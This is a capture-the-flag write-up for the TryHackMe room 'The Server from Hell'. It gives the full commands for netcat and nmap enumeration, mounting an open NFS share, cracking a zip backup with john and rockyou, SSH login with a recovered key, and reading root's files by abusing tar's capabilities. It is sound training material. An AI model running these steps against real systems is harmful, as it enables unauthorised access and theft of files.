---
title: "THM: The Server from Hell"
date: 2025-03-02
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-the-server-from-hell
image:
  path: /assets/img/thumbnails/ctf-the-server-from-hell.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Medium  

#### **Tools Used**:

  - `nmap`
  - `netcat (nc)`
  - `zipinfo`, `zip2john`, `john`
  - `ssh`
  - `getcap`
  - `tar`

#### **Resources Used:**:

  - [Tryhackme](https://tryhackme.com/room/theserverfromhell)
  - `/usr/share/wordlists/rockyou.txt`


## **Steps for the CTF**

---

### Step 1: Enumeration
The first step in any CTF is enumeration. Start by connecting to port `1337` using `netcat`:
```bash
nc <IP> 1337
```
You will need to enumerate multiple ports to find hidden services. Use a loop to automate this process:
```bash
for i in {1..100}; do nc <IP> $i; echo ""; done
```
Once you identify an open port (e.g., `12345`), connect to it:
```bash
nc <IP> 12345
```
Perform a detailed scan of the target machine using `nmap`:
```bash
nmap -sC -sV -p111,2049 <IP>
```

### Step 2: NFS Mounting
From the `nmap` results, you may discover an NFS share. Create a directory and mount the NFS share:
```bash
mkdir nfs
sudo mount -t nfs <IP>: nfs
tree nfs
```
Inspect the contents of the mounted directory to find useful files.

### Step 3: Cracking the Backup File
Inside the NFS share, you will find a `backup.zip` file. Extract information about the zip file:
```bash
zipinfo backup.zip
```
Convert the zip file into a hash format compatible with `john`:
```bash
zip2john backup.zip > backup.hash
```
Crack the hash using `john` and the `rockyou.txt` wordlist:
```bash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Once cracked, extract the contents of the zip file and locate the `flag.txt`.

### Step 4: SSH Access
In the extracted files, you will find a `hint.txt` file. Read it for clues:
```bash
cat hint.txt
```
Perform another `nmap` scan to discover open SSH ports:
```bash
nmap -sV -p 2500-4500 <IP> | grep -i ssh
```
Locate the private key (`id_rsa`) and set the correct permissions:
```bash
chmod 600 id_rsa
```
Use the private key to SSH into the server as the user `hades`:
```bash
ssh -i id_rsa hades@<IP> -p 3333
```
Once logged in, spawn a proper shell:
```bash
exec '/bin/bash'
```
Locate and read the `user.txt` file:
```bash
cat user.txt
```

### Step 5: Privilege Escalation
To escalate privileges, check for capabilities assigned to binaries:
```bash
getcap -r / 2>/dev/null
```
Identify a binary with unusual capabilities (e.g., `tar`). Use it to copy the `root.txt` file from the `/root` directory:
```bash
tar -cvf flag.tar /root/root.txt
tar xf flag.tar
```
Read the contents of the `root.txt` file:
```bash
cat root/root.txt
```
